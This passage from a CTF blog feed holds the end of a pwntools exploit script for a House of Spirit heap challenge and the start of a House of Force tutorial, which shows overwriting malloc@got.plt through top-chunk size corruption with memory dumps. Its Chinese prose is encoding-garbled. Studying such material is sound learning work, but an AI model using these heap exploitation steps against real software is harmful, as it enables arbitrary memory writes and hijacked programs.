process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;114514&#x27;</span>)  <br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x000000000060208d</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#1</span><br>payload1 = <span class="hljs-number">0x3</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x1BF60</span>)<br>add(<span class="hljs-number">0x60</span> , payload1) <span class="hljs-comment">#2</span><br>getflag()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House of Spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Forceæ”»å‡»</title>
    <link href="/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>House Of Force æ˜¯ä¸€ç§å †åˆ©ç”¨æ–¹æ³•ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è¯´ House Of Force å¿…é¡»å¾—åŸºäºå †æ¼æ´æ¥è¿›è¡Œåˆ©ç”¨ã€‚å¦‚æœä¸€ä¸ªå † (heap based) æ¼æ´æƒ³è¦é€šè¿‡ House Of Force æ–¹æ³•è¿›è¡Œåˆ©ç”¨ï¼Œéœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š</p><ol><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</li></ol><p>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œæ ¹æ®å‰é¢å †æ•°æ®ç»“æ„éƒ¨åˆ†çš„çŸ¥è¯†æˆ‘ä»¬å¾—çŸ¥ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</p><p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunk æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚ç„¶è€Œåœ¨ glibc ä¸­ï¼Œä¼šå¯¹ç”¨æˆ·è¯·æ±‚çš„å¤§å°å’Œ top chunk ç°æœ‰çš„ size è¿›è¡ŒéªŒè¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼ï¼Œå°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶ top chunk size åŸŸçš„æ¼æ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)<br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬çš„åšæ³•æ˜¯æŠŠ top chunk çš„ size æ”¹ä¸º - 1ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¯”è¾ƒæ—¶ä¼šæŠŠ size è½¬æ¢æˆæ— ç¬¦å·æ•°ï¼Œå› æ­¤ -1 ä¹Ÿå°±æ˜¯è¯´ unsigned long ä¸­æœ€å¤§çš„æ•°ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•éƒ½å¯ä»¥é€šè¿‡éªŒè¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">remainder      = chunk_at_offset(victim, nb);<br>av-&gt;top        = remainder;<br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿™é‡Œä¼šæŠŠ top æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼ (write-anything-anywhere)ã€‚</p><p><strong>ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtopchunk çš„ size ä¹Ÿä¼šæ›´æ–°ï¼Œå…¶æ›´æ–°çš„æ–¹æ³•å¦‚ä¸‹</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<br>size   = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | PREV_INUSE);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä¸‹æ¬¡åœ¨æŒ‡å®šä½ç½®åˆ†é…å¤§å°ä¸º x çš„ chunkï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿ remainder_size ä¸å°äº x+ MINSIZEã€‚</p><h2 id="ç®€å•ç¤ºä¾‹"><a href="#ç®€å•ç¤ºä¾‹" class="headerlink" title="ç®€å•ç¤ºä¾‹"></a>ç®€å•ç¤ºä¾‹</h2><p>åœ¨å­¦ä¹ å®Œ HOF çš„åŸç†ä¹‹åï¼Œæˆ‘ä»¬è¿™é‡Œé€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜ HOF çš„åˆ©ç”¨ï¼Œè¿™ä¸ªä¾‹å­çš„ç›®æ ‡æ˜¯é€šè¿‡ HOF æ¥ç¯¡æ”¹ <code>malloc@got.plt</code> å®ç°åŠ«æŒç¨‹åºæµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> *ptr,*ptr2;<br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr=(<span class="hljs-type">long</span> *)(((<span class="hljs-type">long</span>)ptr)+<span class="hljs-number">24</span>);<br>    *ptr=<span class="hljs-number">-1</span>;        <span class="hljs-comment">// &lt;=== è¿™é‡ŒæŠŠtop chunkçš„sizeåŸŸæ”¹ä¸º0xffffffffffffffff</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">-4120</span>);  <span class="hljs-comment">// &lt;=== å‡å°top chunkæŒ‡é’ˆ</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);   <span class="hljs-comment">// &lt;=== åˆ†é…å—å®ç°ä»»æ„åœ°å€å†™</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ†é…ä¸€ä¸ª 0x10 å­—èŠ‚å¤§å°çš„å—</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x0000000000020fe1 &lt;=== top chunk<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæŠŠ top chunk çš„ size æ”¹ä¸º 0xffffffffffffffffï¼Œåœ¨çœŸæ­£çš„é¢˜ç›®ä¸­ï¼Œè¿™ä¸€æ­¥å¯ä»¥é€šè¿‡å †æº¢å‡ºç­‰æ¼æ´æ¥å®ç°ã€‚ å› ä¸º -1 åœ¨è¡¥ç ä¸­æ˜¯ä»¥ 0xffffffffffffffff è¡¨ç¤ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥èµ‹å€¼ -1 å°±å¯ä»¥ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>xffffffffffffffff &lt;=== top chunk sizeåŸŸè¢«æ›´æ”¹<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„æ­¤æ—¶çš„ top chunk ä½ç½®ï¼Œå½“æˆ‘ä»¬è¿›è¡Œä¸‹ä¸€æ¬¡åˆ†é…çš„æ—¶å€™å°±ä¼šæ›´æ”¹ top chunk çš„ä½ç½®åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:    <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000602020 &lt;=== top chunkæ­¤æ—¶ä¸€åˆ‡æ­£å¸¸<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œ<code>malloc(-4120);</code>ï¼Œ-4120 æ˜¯æ€ä¹ˆå¾—å‡ºçš„å‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®è¦å†™å…¥çš„ç›®çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ç¼–è¯‘ç¨‹åºåï¼Œ0x601020 æ˜¯ <code>malloc@got.plt</code> çš„åœ°å€</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x601020</span>:   <span class="hljs-number">0</span>x00007ffff<span class="hljs-number">7a91130</span> &lt;=== malloc@got.plt<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥å°† top chunk æŒ‡å‘ 0x601010 å¤„ï¼Œè¿™æ ·å½“ä¸‹æ¬¡å†åˆ†é… chunk æ—¶ï¼Œå°±å¯ä»¥åˆ†é…åˆ° <code>malloc@got.plt</code> å¤„çš„å†…å­˜äº†ã€‚</p><p>ä¹‹åæ˜ç¡®å½“å‰ top chunk çš„åœ°å€ï¼Œæ ¹æ®å‰é¢æè¿°ï¼Œtop chunk ä½äº 0x602020ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¡ç®—åç§»å¦‚ä¸‹</p><p>0x601010-0x602020&#x3D;-4112</p><p>æ­¤å¤–ï¼Œç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ï¼Œä¸€æ—¦è¿›å…¥ç”³è¯·å†…å­˜çš„å‡½æ•°ä¸­å°±å˜æˆäº†æ— ç¬¦å·æ•´æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__libc_malloc(<span class="hljs-type">size_t</span> bytes) &#123;<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ç”¨æˆ·è¾“å…¥çš„å¤§å°ç»è¿‡å†…éƒ¨çš„ <code>checked_request2size</code>å¯ä»¥å¾—åˆ°è¿™æ ·çš„å¤§å°ï¼Œå³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ (sizeof(size_t))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ REQUEST_OUT_OF_RANGE(req) è¿™ä¸ªæ£€æµ‹ï¼Œå³æˆ‘ä»¬ä¼ ç»™ malloc çš„å€¼åœ¨è´Ÿæ•°èŒƒå›´å†…ï¼Œä¸å¾—å¤§äº -2 * MINSIZEï¼Œè¿™ä¸ªä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯å¯ä»¥æ»¡è¶³çš„ã€‚</p><ul><li>MALLOC_ALIGN_MASK : æ˜¯ç”¨äºå¯¹é½çš„æ©ç ã€‚<ul><li>32ä½ ï¼š0x07 </li><li>64ä½ ï¼š0x0F</li></ul></li><li>MALLOC_ALIGNMENT ï¼šæ˜¯å¯¹é½çš„å¤§å°<ul><li>32ä½ ï¼š8å­—èŠ‚</li><li>64ä½ ï¼š16å­—èŠ‚</li></ul></li></ul><p>å¦ä¸€æ–¹é¢ï¼Œåœ¨æ»¡è¶³å¯¹åº”çš„çº¦æŸåï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾— <code>request2size</code>æ­£å¥½è½¬æ¢ä¸ºå¯¹åº”çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾— ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK æ°å¥½ä¸º - 4112ã€‚é¦–å…ˆï¼Œå¾ˆæ˜¾ç„¶ï¼Œ-4112 æ˜¯ chunk å¯¹é½çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†å…¶åˆ†åˆ«å‡å» SIZE_SZï¼ŒMALLOC_ALIGN_MASK å°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„éœ€è¦ç”³è¯·çš„å€¼ã€‚å…¶å®æˆ‘ä»¬è¿™é‡Œåªéœ€è¦å‡ SIZE_SZ å°±å¯ä»¥äº†ï¼Œå› ä¸ºå¤šå‡çš„ MALLOC_ALIGN_MASK æœ€åè¿˜ä¼šè¢«å¯¹é½æ‰ã€‚è€Œ<strong>å¦‚æœ -4112 ä¸æ˜¯ MALLOC_ALIGN çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦å¤šå‡ä¸€äº›äº†ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬æœ€å¥½ä½¿å¾—åˆ†é…ä¹‹åå¾—åˆ°çš„ chunk ä¹Ÿæ˜¯å¯¹é½çš„ï¼Œå› ä¸ºåœ¨é‡Šæ”¾ä¸€ä¸ª chunk çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œå¯¹é½æ£€æŸ¥ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK == <span class="hljs-number">-4112</span><br></code></pre></td></tr></table></figure><ul><li>å¯¹äºå¯¹é½æƒ…å†µ<ul><li>req &#x3D; - è·ç¦» - SIZE_SZ</li></ul></li><li>å¯¹äºæ²¡æœ‰å¯¹é½æƒ…å†µ<ul><li>req &#x3D; - è·ç¦» - SIZE_SZ - MALLOC_ALIGN_MASK</li></ul></li></ul><p>å› æ­¤ï¼Œæˆ‘ä»¬å½“è°ƒç”¨<code>malloc(-4120)</code>ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ° top chunk è¢«æŠ¬é«˜åˆ°æˆ‘ä»¬æƒ³è¦çš„ä½ç½®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:\   <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000601010 &lt;=== å¯ä»¥è§‚å¯Ÿåˆ°top chunkè¢«æŠ¬é«˜<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬åˆ†é…çš„å—å°±ä¼šå‡ºç°åœ¨ 0x601010+0x10 çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ 0x601020 å¯ä»¥æ›´æ”¹ got è¡¨ä¸­çš„å†…å®¹äº†ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¢«æŠ¬é«˜çš„åŒæ—¶ï¼Œmalloc@got é™„è¿‘çš„å†…å®¹ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">set_head(<span class="hljs-name">victim</span>, nb | PREV_INUSE |<br>        (<span class="hljs-name">av</span> != <span class="hljs-symbol">&amp;main_arena</span> ? NON_MAIN_ARENA : <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜"><a 